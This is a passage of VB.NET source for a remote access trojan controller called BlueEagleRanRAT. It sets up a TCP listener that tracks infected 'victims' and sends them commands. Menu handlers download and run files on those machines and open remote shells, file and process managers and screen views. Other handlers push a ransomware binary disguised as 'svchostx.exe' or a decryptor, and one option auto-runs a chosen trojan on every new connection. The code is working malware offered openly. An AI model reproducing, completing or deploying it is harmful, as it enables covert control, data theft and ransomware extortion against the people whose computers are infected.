            ListBox2.Items.Add(country)
        End If
    End Sub

    Friend Sub AddTest()



        xAdd("Trojan", "fefe", "Windows 7 Ultimate", "Egypt", "156.25.195.42", "Yes")
        ListBox1.Items.Add("156.25.195.42" & " Connected ")
        xAdd("Trojan", "tete", "Windows Server 2008", "Algeria", "45.142.158.92", "No")
        ListBox1.Items.Add("45.142.158.92" & " Connected ")
        xAdd("Trojan", "lele", "Windows 10 Pro insider", "Japan", "149.210.152.21", "Yes")
        ListBox1.Items.Add("149.210.152.21" & " Connected ")
        xAdd("Trojan", "lele", "Windows 8 Home Single Language", "Australia", "194.85.110.78", "Yes")
        ListBox1.Items.Add("194.85.110.78" & " Connected ")
        xAdd("Trojan", "tete", "Windows Server 2003", "United States", "210.49.58.154", "No")
        ListBox1.Items.Add("210.49.58.154" & " Connected ")

    End Sub
    Private Sub xAdd(ByVal a1 As String, a2 As String, a3 As String, a4 As String, ip As String, ByVal ran As String)
        Dim lx As New ListViewItem
        lx.Text = a1 & " " & ip & vbNewLine & "OS :  " & a3 & vbNewLine & "Country : " & a4
        lx.SubItems.Add(ip)
        lx.SubItems.Add(a2) ' pc name
        lx.SubItems.Add(a3) ' OS
        lx.SubItems.Add(a4) ' country
        lx.SubItems.Add(ran) ' ransom
        If ran.Equals("Yes") Then
            lx.ImageIndex = Return_Index_Ran_l3(a3)
        ElseIf ran.Equals("No") Then
            lx.ImageIndex = Return_Index_Ranl3(a3)
        End If

        draw(lx.Position)
        l1.Items.Add(lx)

    End Sub


    Private FireAdd As Boolean = False

    Private Sub ListView1_Resize(sender As System.Object, e As System.EventArgs) Handles l1.Resize
Resizex:
        If FireAdd = False Then
            AddFirewall()
            Me.Left += 1

            FireAdd = True
            OldWidth = l1.Size.Width
            OldH = l1.Size.Height
            Exit Sub
        Else
            Masterpoint = New Point(l1.Size.Width / 2, 5)

        End If
        If OldWidth <> l1.Width Then
            l1.Update()
            l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
            OldWidth = l1.Width
        End If
        If OldH <> l1.Height Then
            l1.Update()
            l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
            OldH = l1.Height
        End If
    End Sub

    Private Sub Loader()

        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/BlueEagleRanRAT") Then

        Else
            My.Computer.FileSystem.CreateDirectory _
    (Application.StartupPath & "/BlueEagleRanRAT")

        End If
        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/BlueEagleRanRAT/Downloads") Then

        Else
            My.Computer.FileSystem.CreateDirectory _
    (Application.StartupPath & "/BlueEagleRanRAT/Downloads")

        End If
        Me.CheckForIllegalCrossThreadCalls = False


    End Sub



    Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs)
        If Label2.Text.Equals("--") Then
            MsgBox("Exception :" & vbNewLine & "There`s no chosen file , Browse for a file")
            CheckBox1.Checked = False
            Exit Sub
        End If
    End Sub
    Private Sub StartListen(ByVal port As Integer)

        s = New SocketServer
        s.Start(port)

    End Sub


    Private Sub ContextMenuStrip1_Opening(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening
        If l1.SelectedItems.Count > 0 Then
            ContextMenuStrip1.Enabled = True

        Else
            ContextMenuStrip1.Enabled = False
        End If

    End Sub


    Private Sub UninstallToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        'uninstall
        For Each PC As ListViewItem In l1.SelectedItems
            s.Send(PC.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        'rename 
        Dim xn = InputBox("Enter new name ", "Change Payload name", Me.BuilderName)
        If xn.Length = 0 Then
            xn = Me.BuilderName
            MsgBox("No name Entered " & vbNewLine & "Handled : name Reset [ " & xn & "] .")
        ElseIf xn.Length > 0 Then
            For Each PC As ListViewItem In l1.SelectedItems
                s.Send(PC.ToolTipText, "renx" & YY & xn)
            Next

        End If
    End Sub
    Private Sub CloseConnectionToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CloseConnectionToolStripMenuItem.Click
        'close connection

        For Each PC As ListViewItem In l1.SelectedItems
            s.Send(PC.ToolTipText, "Endme")
        Next


    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromLinkToolStripMenuItem.Click
        'run from link
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "download" & "||" & a & "||" & aa)
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        'run from disk
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In l1.SelectedItems
                s.Send(x.ToolTipText, "sendfile" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub



    Private Sub RemoteFileManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteFileManagerToolStripMenuItem.Click
        'file manager
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openfm")
        Next
    End Sub


    Private Sub RemoteProcessToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteProcessToolStripMenuItem.Click
        'process manager
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "\\")
        Next
    End Sub

    Private Sub RemoteCmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCmsToolStripMenuItem.Click
        'cmd
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "rss" & "||")
        Next
    End Sub

    Private Sub ChatToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ChatToolStripMenuItem.Click
        'chat
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openchat")
        Next
    End Sub

    Private Sub RemoteScreenToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteScreenToolStripMenuItem.Click
        'desktop
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub EncryptAllFilesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EncryptAllFilesToolStripMenuItem.Click
        'Encrypt with Ransomware
        If URan = True Then
            If IO.File.Exists(RanosmwarePath) Then
                Dim BN As String = "svchostx.exe"
                Dim path As String = RanosmwarePath
                For Each x As ListViewItem In l1.SelectedItems
                    s.Send(x.ToolTipText, "encRan" & "||" & BN & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(path)))
                Next
            End If


        Else
            MsgBox("Use Command (use ran -g) for updating Ransomware Settings " & vbNewLine & " Make sure that antivirus is deactivated ", MsgBoxStyle.Information)
            If IO.File.Exists(RanosmwarePath) Then
                IO.File.Delete(RanosmwarePath)
            End If

        End If

    End Sub

    Private Sub DecryptAllFilesToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DecryptAllFilesToolStripMenuItem.Click
        'decrypt device 
        'get new file extention from user if he changed

        Dim BN As String = "svchostxdec.exe"

        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "decRan" & "||" & BN & "||" & Convert.ToBase64String(My.Resources.svchdec))
        Next


        '
    End Sub



    Private Sub Scroller()
        RichTextBox1.ScrollToCaret()
    End Sub
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        l1.CreateGraphics.DrawImage(firepic.Image, New Point(Masterpoint.X - 100, Masterpoint.Y))
        RichTextBox1.Focus()
        RichTextBox1.ScrollToCaret()
        ' AddTest()

        Timer2.Start()


        Timer1.Stop()
    End Sub

    Private Sub RichTextBox1_SelectionChanged(sender As System.Object, e As System.EventArgs) Handles RichTextBox1.SelectionChanged
        Scroller()
    End Sub


    Private Sub RichTextBox1_MouseHover(sender As System.Object, e As System.EventArgs) Handles RichTextBox1.MouseHover
        Scroller()
    End Sub
    Public ooox As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + "oox.jpg"
    Private picBox As New PictureBox
    Public Sub VFRX()
        imge_desik()
    End Sub
    Private Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = ooox

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 2000
        Dim height As Integer = 2000
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub

    Friend Sub RunfileMaster(ByVal sock As Integer, ByVal Filename As String, ByVal FileString As String)
        'run from disk 
        On Error Resume Next

        s.Send(sock, "sendfile" & YY & Filename & YY & FileString)


    End Sub

    Friend Sub RemoveVictimMaster(ByVal sock As Integer)
        On Error Resume Next

        s.Send(sock, "Endme")
    End Sub
    Friend Sub CutVictimMaster(ByVal sock As Integer)
        s.Send(sock, "Endme")
    End Sub
    Friend Sub DirectlinkMaster(ByVal sock As Integer, ByVal directurl As String, ByVal filename As String)
        On Error Resume Next

        s.Send(sock, "download" & YY & directurl & YY & filename)

    End Sub

    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        'Browse for auto trojan
        OpenFileDialog1.Filter = "Executables | *.exe"
        If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            Label2.Text = OpenFileDialog1.FileName

        Else
            MsgBox("Please Choose the Exact file ", MsgBoxStyle.Critical)
        End If
    End Sub

    

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
 
        For Each x As ListViewItem In l1.Items
            Dim sockx As Integer = x.ToolTipText
            If s.Checkconnected(sockx) = False Then
                x.Remove()
                s.CDis(sockx)
                l1.Update()
            End If
        Next

    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick


    End Sub

    




    Private Sub Form1_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If issign = False Then
            End
        End If

    End Sub

    Private Sub CheckBox1_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If Label2.Text.Equals("--") Then
            MsgBox("Please Choose a file to run it Automatically to victims after they connect", MsgBoxStyle.Critical)
            CheckBox1.Checked = False
        End If
    End Sub
End Class
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
'#################### Modules
Friend Module Functions

    Friend Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Friend Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Friend Function fx(ByVal b As Byte(), ByVal WRD As String) As Array
        Dim a As New List(Of Byte())
        Dim M As New IO.MemoryStream
        Dim MM As New IO.MemoryStream
        Dim T As String() = Split(BS(b), WRD)
        M.Write(b, 0, T(0).Length)
        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
        a.Add(M.ToArray)
        a.Add(MM.ToArray)
        M.Dispose()
        MM.Dispose()
        Return a.ToArray
    End Function
    Friend Function GetCountryNumber(ByVal queryCountry As String) As Integer
        Select Case queryCountry
            Case UCase("Afghanistan")
                GetCountryNumber = 1
            Case UCase("Albania")
                GetCountryNumber = 2
            Case UCase("Algeria")
                GetCountryNumber = 3
            Case UCase("American Samoa")
                GetCountryNumber = 4
            Case UCase("Andorra")
                GetCountryNumber = 5
            Case UCase("Angola")
                GetCountryNumber = 6
            Case UCase("Anguilla")
                GetCountryNumber = 7
            Case UCase("Antigua and Barbuda")
                GetCountryNumber = 8
            Case UCase("Argentina")
                GetCountryNumber = 9
            Case UCase("Armenia")
                GetCountryNumber = 10
            Case UCase("Aruba")
                GetCountryNumber = 11
            Case UCase("Australia")
                GetCountryNumber = 12
            Case UCase("Austria")
                GetCountryNumber = 13
            Case UCase("Azerbaijan")
                GetCountryNumber = 14
            Case UCase("Bahamas")
                GetCountryNumber = 15
            Case UCase("Bahrain")
                GetCountryNumber = 16
            Case UCase("Bangladesh")
                GetCountryNumber = 17
            Case UCase("Barbados")
                GetCountryNumber = 18
            Case UCase("Belarus")
                GetCountryNumber = 19
            Case UCase("Belgium")
                GetCountryNumber = 20
            Case UCase("Belize")
                GetCountryNumber = 21
            Case UCase("Benin")
                GetCountryNumber = 22
            Case UCase("Bermuda")
                GetCountryNumber = 23
            Case UCase("Bhutan")
                GetCountryNumber = 24
            Case UCase("Bolivia")
                GetCountryNumber = 25
            Case UCase("Bosnia & Herzegovina")
                GetCountryNumber = 26
            Case UCase("Botswana")
                GetCountryNumber = 27
            Case UCase("Bouvet Island")
                GetCountryNumber = 28
            Case UCase("Brazil")
                GetCountryNumber = 29
            Case UCase("British Indian Ocean Territory")
                GetCountryNumber = 30
            Case UCase("British Virgin Islands")
                GetCountryNumber = 31
            Case UCase("Brunei")
                GetCountryNumber = 32
            Case UCase("Bulgaria")
                GetCountryNumber = 33
            Case UCase("Burkina Faso")
                GetCountryNumber = 34
            Case UCase("Burundi")
                GetCountryNumber = 35
            Case UCase("Cambodia")
                GetCountryNumber = 36
            Case UCase("Cameroon")
                GetCountryNumber = 37
            Case UCase("Canada")
                GetCountryNumber = 38
            Case UCase("Cape Verde")
                GetCountryNumber = 39
            Case UCase("catalonia")
                GetCountryNumber = 40
            Case UCase("Cayman Islands")
                GetCountryNumber = 41
            Case UCase("Central African Republic")
                GetCountryNumber = 42
            Case UCase("Chad")
                GetCountryNumber = 43
            Case UCase("Chile")
                GetCountryNumber = 44
            Case UCase("China")
                GetCountryNumber = 45
            Case UCase("Christmas Islands")
                GetCountryNumber = 46
            Case UCase("Cocos (Keeling) Islands")
                GetCountryNumber = 47
            Case UCase("Colombia")
                GetCountryNumber = 48
            Case UCase("Comoras")
                GetCountryNumber = 49
            Case UCase("Congo, the Democratic Republic of the")
                GetCountryNumber = 50
            Case UCase("Costa Rica")
                GetCountryNumber = 51
            Case UCase("Croatia")
                GetCountryNumber = 52
            Case UCase("Cuba")
                GetCountryNumber = 53
            Case UCase("Cyprus")
                GetCountryNumber = 54
            Case UCase("Czech Republic")
                GetCountryNumber = 55
            Case UCase("Denmark")
                GetCountryNumber = 56
            Case UCase("Djibouti")
                GetCountryNumber = 57
            Case UCase("Dominica")
                GetCountryNumber = 58
            Case UCase("Dominican Republic")
                GetCountryNumber = 59
            Case UCase("Ecuador")
                GetCountryNumber = 60
            Case UCase("Egypt")
                GetCountryNumber = 61
            Case UCase("El Salvador")
                GetCountryNumber = 62
            Case UCase("England")
                GetCountryNumber = 63
            Case UCase("Equatorial Guinea")
                GetCountryNumber = 64
            Case UCase("Eritrea")
                GetCountryNumber = 65
            Case UCase("Estonia")
                GetCountryNumber = 66
            Case UCase("Ethiopia")
                GetCountryNumber = 67
            Case UCase("europeanunion")
                GetCountryNumber = 68
            Case UCase("Falkland Islands (Malvinas)")
                GetCountryNumber = 69
            Case UCase("Faroe Islands")
                GetCountryNumber = 70
            Case UCase("Fiji")
                GetCountryNumber = 71
            Case UCase("Finland")
                GetCountryNumber = 72
            Case UCase("France")
                GetCountryNumber = 73
            Case UCase("French Guiana")
                GetCountryNumber = 74
            Case UCase("French Polynesia")
                GetCountryNumber = 75
            Case UCase("French Southern Territories")
                GetCountryNumber = 76
            Case UCase("Gabon")
                GetCountryNumber = 77
            Case UCase("Gambia")
                GetCountryNumber = 78
            Case UCase("Georgia")
                GetCountryNumber = 79
            Case UCase("Germany")
                GetCountryNumber = 80
            Case UCase("Ghana")
                GetCountryNumber = 81
            Case UCase("Gibraltar")
                GetCountryNumber = 82
            Case UCase("Greece")
                GetCountryNumber = 83
            Case UCase("Greenland")
                GetCountryNumber = 84
            Case UCase("Grenada")
                GetCountryNumber = 85
            Case UCase("Guadeloupe")
                GetCountryNumber = 86
            Case UCase("Guam")
                GetCountryNumber = 87
            Case UCase("Guatemala")
                GetCountryNumber = 88
            Case UCase("Guinea")
                GetCountryNumber = 89
            Case UCase("Guinea-Bissau")
                GetCountryNumber = 90
            Case UCase("Guyana")
                GetCountryNumber = 91
            Case UCase("Haiti")
                GetCountryNumber = 92
            Case UCase("Heard Island and McDonald Islands")
                GetCountryNumber = 93
            Case UCase("Honduras")
                GetCountryNumber = 94
            Case UCase("Hong Kong")
                GetCountryNumber = 95
            Case UCase("Hungary")
                GetCountryNumber = 96
            Case UCase("Iceland")
                GetCountryNumber = 97
            Case UCase("India")
                GetCountryNumber = 98
            Case UCase("Indonesia")
                GetCountryNumber = 99
            Case UCase("Iran, Islamic Republic of")
                GetCountryNumber = 100
            Case UCase("Iraq")
                GetCountryNumber = 101
            Case UCase("Ireland")
                GetCountryNumber = 102
            Case UCase("Israel")
                GetCountryNumber = 103
            Case UCase("Italy")
                GetCountryNumber = 104
            Case UCase("Jamaica")
                GetCountryNumber = 105
            Case UCase("Japan")
                GetCountryNumber = 106
            Case UCase("Jordan")
                GetCountryNumber = 107
            Case UCase("Kazakhstan")
                GetCountryNumber = 108
            Case UCase("Kenya")
                GetCountryNumber = 109
            Case UCase("Kiribati")
                GetCountryNumber = 110
            Case UCase("Korea, Democratic People's Republic of")
                GetCountryNumber = 111
            Case UCase("Korea, Republic of")
                GetCountryNumber = 112
            Case UCase("Kuwait")
                GetCountryNumber = 113
            Case UCase("Kyrgyzstan")
                GetCountryNumber = 114
            Case UCase("Laos")
                GetCountryNumber = 115
            Case UCase("Latvia")
                GetCountryNumber = 116
            Case UCase("Lebanon")
                GetCountryNumber = 117
            Case UCase("Lesotho")
                GetCountryNumber = 118
            Case UCase("Liberia")
                GetCountryNumber = 119
            Case UCase("Libya")
                GetCountryNumber = 120
            Case UCase("Liechtenstein")
                GetCountryNumber = 121
            Case UCase("Lithuania")
                GetCountryNumber = 122
            Case UCase("Luxembourg")
                GetCountryNumber = 123
            Case UCase("Macao")
                GetCountryNumber = 124
            Case UCase("Macedonia")
                GetCountryNumber = 125
            Case UCase("Madagascar")
                GetCountryNumber = 126
            Case UCase("Malawi")
                GetCountryNumber = 127
            Case UCase("Malaysia")
                GetCountryNumber = 128
            Case UCase("Maldives")
                GetCountryNumber = 129
            Case UCase("Mali")
                GetCountryNumber = 130
            Case UCase("Malta")
                GetCountryNumber = 131
            Case UCase("Marshall Islands")
                GetCountryNumber = 132
            Case UCase("Martinique")
                GetCountryNumber = 133
            Case UCase("Mauritania")
                GetCountryNumber = 134
            Case UCase("Mauritius")
                GetCountryNumber = 135
            Case UCase("Mayotte")
                GetCountryNumber = 136
            Case UCase("Mexico")
                GetCountryNumber = 137
            Case UCase("Micronesia, Federated States of")
                GetCountryNumber = 138
            Case UCase("Moldava")
                GetCountryNumber = 139
            Case UCase("Monaco")
                GetCountryNumber = 140
            Case UCase("Mongolia")
                GetCountryNumber = 141
            Case UCase("Montenegro")
                GetCountryNumber = 142
            Case UCase("Montserrat")
                GetCountryNumber = 143
            Case UCase("Morocco")
                GetCountryNumber = 144
            Case UCase("Mozambique")
                GetCountryNumber = 145
            Case UCase("Myanmar")
                GetCountryNumber = 146
            Case UCase("Namibia")
                GetCountryNumber = 147
            Case UCase("Nauru")
                GetCountryNumber = 148
            Case UCase("Nepal")
                GetCountryNumber = 149
            Case UCase("Netherlands Antilles")
                GetCountryNumber = 150
            Case UCase("Netherlands, The")
                GetCountryNumber = 151
            Case UCase("New Caledonia")
                GetCountryNumber = 152
            Case UCase("New Zealand")
                GetCountryNumber = 153
            Case UCase("Nicaragua")
                GetCountryNumber = 154
            Case UCase("Niger")
                GetCountryNumber = 155
            Case UCase("Nigeria")
                GetCountryNumber = 156
            Case UCase("Niue")
                GetCountryNumber = 157
            Case UCase("Norfolk Island")
                GetCountryNumber = 158
            Case UCase("Northern Mariana Islands")
                GetCountryNumber = 159
            Case UCase("Norway")
                GetCountryNumber = 160
            Case UCase("Oman")
                GetCountryNumber = 161
            Case UCase("Pakistan")
                GetCountryNumber = 162
            Case UCase("Palau")
                GetCountryNumber = 163
            Case UCase("Panama")
                GetCountryNumber = 164
            Case UCase("Papua New Guinea")
                GetCountryNumber = 165
            Case UCase("Paraguay")
                GetCountryNumber = 166
            Case UCase("Peru")
                GetCountryNumber = 167
            Case UCase("Phillipines")
                GetCountryNumber = 168
            Case UCase("Pitcairn Islands")
                GetCountryNumber = 169
            Case UCase("Poland")
                GetCountryNumber = 170
            Case UCase("Portugal")
                GetCountryNumber = 171
            Case UCase("ps")
                GetCountryNumber = 172
            Case UCase("Puerto Rico")
                GetCountryNumber = 173
            Case UCase("Qatar")
                GetCountryNumber = 174
            Case UCase("Reunion")
                GetCountryNumber = 175
            Case UCase("Romania")
                GetCountryNumber = 176
            Case UCase("rs")
                GetCountryNumber = 177
            Case UCase("Russian Federation")
                GetCountryNumber = 178
            Case UCase("Rwanda")
                GetCountryNumber = 179
            Case UCase("Saint Helena")
                GetCountryNumber = 180
            Case UCase("Saint Kitts and Nevis")
                GetCountryNumber = 181
            Case UCase("Saint Lucia")
                GetCountryNumber = 182
            Case UCase("Saint Pierre")
                GetCountryNumber = 183
            Case UCase("Saint Vincent and the Grenadines")
                GetCountryNumber = 184
            Case UCase("Samoa")
                GetCountryNumber = 185
            Case UCase("San Marino")
                GetCountryNumber = 186
            Case UCase("Sao Tome and Principe")
                GetCountryNumber = 187
            Case UCase("Saudi Arabia")
                GetCountryNumber = 188
            Case UCase("scotland")
                GetCountryNumber = 189
            Case UCase("Senegal")
                GetCountryNumber = 190
            Case UCase("Seychelles")
                GetCountryNumber = 191
            Case UCase("Sierra Leone")
                GetCountryNumber = 192
            Case UCase("Singapore")
                GetCountryNumber = 193
            Case UCase("Slovakia")
                GetCountryNumber = 194
            Case UCase("Slovenia")
                GetCountryNumber = 195
            Case UCase("Solomon Islands")
                GetCountryNumber = 196
            Case UCase("Somalia")
                GetCountryNumber = 197
            Case UCase("South Africa")
                GetCountryNumber = 198
            Case UCase("South Georgia and the South Sandwich Islands")
                GetCountryNumber = 199
            Case UCase("Spain")
                GetCountryNumber = 200
            Case UCase("Sri Lanka")
                GetCountryNumber = 201
            Case UCase("Sudan")
                GetCountryNumber = 202
            Case UCase("Suriname")
                GetCountryNumber = 203
            Case UCase("Svalbard & Jan Mayen Islands")
                GetCountryNumber = 204
            Case UCase("Swaziland")
                GetCountryNumber = 205
            Case UCase("Sweden")
                GetCountryNumber = 206
            Case UCase("Switzerland")
                GetCountryNumber = 207
            Case UCase("Syrian Arab Republic")
                GetCountryNumber = 208
            Case UCase("Taiwan")
                GetCountryNumber = 209
            Case UCase("Tajikistan")
                GetCountryNumber = 210
            Case UCase("Tanzania, United Republic of")
                GetCountryNumber = 211
            Case UCase("Thailand")
                GetCountryNumber = 212
            Case UCase("Togo")
                GetCountryNumber = 213
            Case UCase("Tokelau")
                GetCountryNumber = 214
            Case UCase("Tonga")
                GetCountryNumber = 215
            Case UCase("Trinidad and Tobago")
                GetCountryNumber = 216
            Case UCase("Tunisia")
                GetCountryNumber = 217
            Case UCase("Turkey")
                GetCountryNumber = 218
            Case UCase("Turkmenistan")
                GetCountryNumber = 219
            Case UCase("Turks")
                GetCountryNumber = 220
            Case UCase("Tuvalu")
                GetCountryNumber = 221
            Case UCase("Uganda")
                GetCountryNumber = 222
            Case UCase("Ukraine")
                GetCountryNumber = 223
            Case UCase("United Arab Emirates")
                GetCountryNumber = 224
            Case UCase("United Kingdom")
                GetCountryNumber = 225
            Case UCase("United States Minor Outlying Islands")
                GetCountryNumber = 226
            Case UCase("United States")
                GetCountryNumber = 227
            Case UCase("Uruguay")
                GetCountryNumber = 228
            Case UCase("Uzbekistan")
                GetCountryNumber = 229
            Case UCase("Wales")
                GetCountryNumber = 230
            Case UCase("Wallis and Futuna")
                GetCountryNumber = 231
            Case UCase("Vanuatu")
                GetCountryNumber = 232
            Case UCase("Vatican City State")
                GetCountryNumber = 233
            Case UCase("Venezuela")
                GetCountryNumber = 234
            Case UCase("Western Sahara")
                GetCountryNumber = 235
            Case UCase("Viet Nam")
                GetCountryNumber = 236
            Case UCase("Virgin Islands, U.S")
                GetCountryNumber = 237
            Case UCase("Yemen")
                GetCountryNumber = 238
            Case UCase("Zambia")
                GetCountryNumber = 229
            Case UCase("Zimbabwe")
                GetCountryNumber = 240
            Case Else
                GetCountryNumber = 241
        End Select

    End Function
    Public Function siz(ByVal Size As String) As String
        If Size.Length < 4 Then
            Return Size & " Bytes"
            Exit Function
        End If
        Dim s As String = Size / 1024
        Dim F As String = " KB"
        Dim ss As Integer
        If InStr(s, ".") > 0 Then
            Dim j As Array = Split(s, ".")
            s = j(0)
            If j(1).ToString.Length > 3 Then
                ss = Mid(j(1), 1, 3)
            Else
                ss = j(1)
            End If
        End If
        If s.Length > 3 Then
            s = s / 1024
            F = " MB"
            If InStr(s, ".") > 0 Then
                Dim j As Array = Split(s, ".")
                s = j(0)
                If j(1).ToString.Length > 3 Then
                    ss = Mid(j(1), 1, 3)
                Else
                    ss = j(1)
                End If
            End If
        End If
        If s.Length > 3 Then
            s = s / 1024
            F = " GB"
            If InStr(s, ".") > 0 Then
                Dim j As Array = Split(s, ".")
                s = j(0)
                If j(1).ToString.Length > 3 Then
                    ss = Mid(j(1), 1, 3)
                Else
                    ss = j(1)
                End If
            End If
        End If
        Return s & "." & ss & F
    End Function
End Module
Friend Class SocketServer
    Private S As TcpListener
    Sub Start(ByVal P As Integer)
        Try
            S = New TcpListener(P)
            S.Start()
            Dim T As New Threading.Thread(AddressOf PND, 10)
            T.Start()
        Catch ex As Exception
            MsgBox("Failure : Port may be used or it`s Filterd " & vbNewLine & P + 3 & " Will be used")
            P = 1177
            Form1.Text &= " Listening on : " & P
            S = New TcpListener(P)
            S.Start()
            Dim T As New Threading.Thread(AddressOf PND, 10)
            T.Start()
        End Try

    End Sub
    Sub Send(ByVal sock As Integer, ByVal s As String)
        Send(sock, SB(s))
    End Sub
    Public Function Checkconnected(ByVal s As Integer) As Boolean
        Try
            Return SK(s).Connected
        Catch ex As Exception
            Return False
        End Try
        Return False
    End Function
    Sub Send(ByVal sock As Integer, ByVal b As Byte())

        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SB(SPL), 0, SPL.Length)
            SK(sock).Send(m.ToArray, 0, m.Length, SocketFlags.None)
            m.Dispose()
        Catch ex As Exception
            Disconnect(sock)
        End Try
    End Sub
    Private SKT As Integer = -1
    Public SK(9999) As Socket
    Public Event Data(ByVal sock As Integer, ByVal B As Byte())
    Public Event DisConnected(ByVal sock As Integer)
    Public Event Connected(ByVal sock As Integer)
    Private SPL As String = "sbj-s" ' split packets by this word
    Private Function NEWSKT() As Integer
re:
        Threading.Thread.CurrentThread.Sleep(1)
        SKT += 1
        If SKT = SK.Length Then
            SKT = 0
            GoTo re
        End If
        If Online.Contains(SKT) = False Then
            Online.Add(SKT)
            Return SKT.ToString.Clone
        End If
        GoTo re
    End Function
    Public Online As New List(Of Integer) ' online clients
    Private Sub PND()
        ReDim SK(9999)
re:

        Threading.Thread.CurrentThread.Sleep(1)
        If S.Pending Then

            Dim sock As Integer = NEWSKT()
            SK(sock) = S.AcceptSocket

            SK(sock).ReceiveBufferSize = 99999
            SK(sock).SendBufferSize = 99999
            SK(sock).ReceiveTimeout = 9000
            SK(sock).SendTimeout = 9000

            Dim t As New Threading.Thread(AddressOf RC, 10)
            t.Start(sock)

            RaiseEvent Connected(sock)
        End If
        GoTo re
    End Sub
    Public Sub CDis(ByVal sock As Integer)
        Disconnect(sock)
    End Sub
    Private Sub Disconnect(ByVal Sock As Integer)

        Try
            SK(Sock).Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            SK(Sock).Close()
        Catch ex As Exception
        End Try
        SK(Sock) = Nothing
    End Sub
    Sub RC(ByVal sock As Integer)

        Dim M As New IO.MemoryStream
        Dim cc As Integer = 0

re:

        cc += 1
        If cc = 500 Then
            Try
                If SK(sock).Poll(-1, Net.Sockets.SelectMode.SelectRead) And SK(sock).Available <= 0 Then
                    GoTo e
                End If
            Catch ex As Exception
                GoTo e
            End Try
            cc = 0
        End If
        Try
            If SK(sock) IsNot Nothing Then

                If SK(sock).Connected Then
                    If SK(sock).Available > 0 Then
                        Dim B(SK(sock).Available - 1) As Byte
                        SK(sock).Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                        M.Write(B, 0, B.Length)
rr:
                        If BS(M.ToArray).Contains(SPL) Then
                            Dim A As Array = fx(M.ToArray, SPL)
                            RaiseEvent Data(sock, A(0))
                            M.Dispose()
                            M = New IO.MemoryStream
                            If A.Length = 2 Then
                                M.Write(A(1), 0, A(1).length)
                                Threading.Thread.CurrentThread.Sleep(1)
                                GoTo rr
                            End If
                        End If

                    End If
                Else
                    GoTo e
                End If
            Else
